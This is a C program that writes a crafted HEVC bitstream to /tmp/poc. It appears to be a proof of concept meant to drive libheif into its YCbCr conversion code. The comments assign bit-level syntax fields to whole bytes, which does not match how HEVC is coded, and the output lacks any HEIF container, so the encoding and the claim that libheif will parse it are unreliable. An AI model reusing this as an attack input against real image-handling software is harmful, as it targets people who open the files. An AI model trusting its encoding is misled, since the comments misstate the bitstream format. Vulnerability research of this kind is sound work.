#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write a minimal HEVC bitstream that will be parsed by libheif */
    /* Start with HEVC start code prefix */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* VPS NAL unit (nal_unit_type=32) - must be present */
    fputc(0x40, f); /* forbidden=0, nal_unit_type=32, nuh_layer_id=0, nuh_temporal_id_plus1=1 */
    fputc(0x01, f); /* vps_video_parameter_set_id=1, vps_base_layer_internal_flag=0, vps_base_layer_available_flag=0 */
    fputc(0x01, f); /* vps_max_layers_minus1=0, vps_max_sub_layers_minus1=0 */
    fputc(0x00, f); /* vps_temporal_id_nesting_flag=0, vps_sub_layer_ordering_info_present_flag=0 */
    fputc(0xFF, f); fputc(0xFF, f); /* vps_reserved_0xffff */
    fputc(0x3F, f); fputc(0xFF, f); /* vps_reserved_0x3fff */
    fputc(0x00, f); /* vps_extension_flag=0 */
    fputc(0x00, f); /* vps_extension_data_flag=0 */

    /* Start code for SPS */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* SPS NAL unit (nal_unit_type=33) - configure for 256x256 */
    fputc(0x42, f); /* forbidden=0, nal_unit_type=33, nuh_layer_id=0, nuh_temporal_id_plus1=1 */
    fputc(0x01, f); /* sps_video_parameter_set_id=1, sps_max_sub_layers_minus1=0, sps_temporal_id_nesting_flag=0 */
    fputc(0x00, f); /* sps_seq_parameter_set_id=0 */
    fputc(0x00, f); /* chroma_format_idc=0 (4:0:0) - use monochrome to simplify but still trigger conversion */
    fputc(0x00, f); /* separate_colour_plane_flag=0 */
    fputc(0x00, f); /* conformance_window_flag=0 */
    fputc(0x00, f); /* bit_depth_luma_minus8=0 */
    fputc(0x00, f); /* bit_depth_chroma_minus8=0 */
    fputc(0x00, f); /* log2_max_pic_order_cnt_lsb_minus4=0 */
    fputc(0x00, f); /* sps_sub_layer_ordering_info_present_flag=0 */
    fputc(0x00, f); /* log2_min_luma_coding_block_size_minus3=0 */
    fputc(0x00, f); /* log2_diff_max_min_luma_coding_block_size=0 */
    fputc(0x00, f); /* log2_min_luma_transform_block_size_minus2=0 */
    fputc(0x00, f); /* log2_diff_max_min_luma_transform_block_size=0 */
    fputc(0x00, f); /* max_transform_hierarchy_depth_inter=0 */
    fputc(0x00, f); /* max_transform_hierarchy_depth_intra=0 */
    fputc(0xF0, f); /* scaling_list_enabled_flag=0, amp_enabled_flag=0, sample_adaptive_offset_enabled_flag=0, pcm_enabled_flag=0 */
    fputc(0x00, f); /* pcm_sample_bit_depth_luma_minus1=0 (not used) */
    fputc(0x00, f); /* num_short_term_ref_pic_sets=0 */
    fputc(0x00, f); /* long_term_ref_pics_present_flag=0 */
    fputc(0x00, f); /* sps_temporal_mvp_enabled_flag=0 */
    fputc(0x00, f); /* strong_intra_smoothing_enabled_flag=0 */
    fputc(0x00, f); /* vui_parameters_present_flag=0 */
    fputc(0x00, f); /* sps_extension_flag=0 */

    /* Start code for PPS */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* PPS NAL unit (nal_unit_type=34) */
    fputc(0x44, f); /* forbidden=0, nal_unit_type=34, nuh_layer_id=0, nuh_temporal_id_plus1=1 */
    fputc(0x01, f); /* pps_pic_parameter_set_id=0, pps_seq_parameter_set_id=1 */
    fputc(0x00, f); /* dependent_slice_segments_enabled_flag=0, output_flag_present_flag=0 */
    fputc(0x00, f); /* num_extra_slice_header_bits=0 */
    fputc(0x00, f); /* sign_data_hiding_enabled_flag=0, cabac_init_present_flag=0 */
    fputc(0x00, f); /* num_ref_idx_l0_default_active_minus1=0 */
    fputc(0x00, f); /* num_ref_idx_l1_default_active_minus1=0 */
    fputc(0x00, f); /* init_qp_minus26=0 */
    fputc(0x00, f); /* constrained_intra_pred_flag=0, transform_skip_enabled_flag=0 */
    fputc(0x00, f); /* cu_qp_delta_enabled_flag=0, diff_cu_qp_delta_depth=0 */
    fputc(0x00, f); /* pps_cb_qp_offset=0, pps_cr_qp_offset=0 */
    fputc(0x00, f); /* pps_slice_chroma_qp_offsets_present_flag=0, weighted_pred_flag=0, weighted_bipred_flag=0 */
    fputc(0x00, f); /* transquant_bypass_enabled_flag=0, tiles_enabled_flag=0, entropy_coding_sync_enabled_flag=0 */
    fputc(0x00, f); /* pps_loop_filter_across_slices_enabled_flag=0, deblocking_filter_control_present_flag=0 */
    fputc(0x00, f); /* deblocking_filter_override_enabled_flag=0, pps_deblocking_filter_disabled_flag=0 */
    fputc(0x00, f); /* pps_scaling_list_data_present_flag=0, lists_modification_present_flag=0 */
    fputc(0x00, f); /* num_ref_idx_l0_default_active_minus1 (repeated), num_ref_idx_l1_default_active_minus1 (repeated) */
    fputc(0x00, f); /* slice_segment_header_extension_present_flag=0, pps_extension_flag=0 */

    /* Start code for first slice */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* IDR slice NAL unit (nal_unit_type=19) */
    fputc(0x26, f); /* forbidden=0, nal_unit_type=19, nuh_layer_id=0, nuh_temporal_id_plus1=1 */
    fputc(0x01, f); /* first_slice_segment_in_pic_flag=1, no_output_of_prior_pics_flag=0 */
    fputc(0x00, f); /* slice_pic_parameter_set_id=0 */
    fputc(0x00, f); /* dependent_slice_segment_flag=0, slice_segment_address=0 */
    fputc(0x00, f); /* slice_type=0 (I-slice), pic_output_flag=1 */
    fputc(0x00, f); /* colour_plane_id=0 */
    fputc(0x00, f); /* slice_pic_order_cnt_lsb=0 */
    fputc(0x00, f); /* short_term_ref_pic_set_sps_flag=0 */
    fputc(0x00, f); /* short_term_ref_pic_set (empty for I-slice) */
    fputc(0x00, f); /* num_long_term_sps=0, num_long_term_pics=0 */
    fputc(0x00, f); /* slice_temporal_mvp_enabled_flag=0, slice_sao_luma_flag=0 */
    fputc(0x00, f); /* slice_sao_chroma_flag=0, num_ref_idx_active_override_flag=0 */
    fputc(0x00, f); /* mvd_l1_zero_flag=0, cabac_init_flag=0 */
    fputc(0x00, f); /* collocated_from_l0_flag=0, collocated_ref_idx=0 */
    fputc(0x00, f); /* five_minus_max_num_merge_cand=4 (default) */
    fputc(0x00, f); /* slice_qp_delta=0 */
    fputc(0x00, f); /* slice_cb_qp_offset=0, slice_cr_qp_offset=0 */
    fputc(0x00, f); /* deblocking_filter_override_flag=0 */
    fputc(0x00, f); /* slice_loop_filter_across_slices_enabled_flag=0 */
    fputc(0x00, f); /* num_entry_point_offsets=0 */
    fputc(0x00, f); /* slice_segment_header_extension_length=0 */

    /* Slice data - all zeros (flat gray) */
    fputc(0x80, f); /* First byte of slice data: end_of_slice_segment_flag=0 with zero coefficients */

    /* Write some more zeros to ensure there's enough data */
    {
        int i;
        for (i = 0; i < 100; i++) {
            fputc(0x00, f);
        }
    }

    /* Need to include enough data for decoder to process */
    /* The actual image data will be zero-coded, resulting in a grayscale image */
    /* This should reach the YCbCr conversion */
    {
        int i;
        for (i = 0; i < 500; i++) {
            fputc(0x00, f);
        }
    }

    fclose(f);
    return 0;
}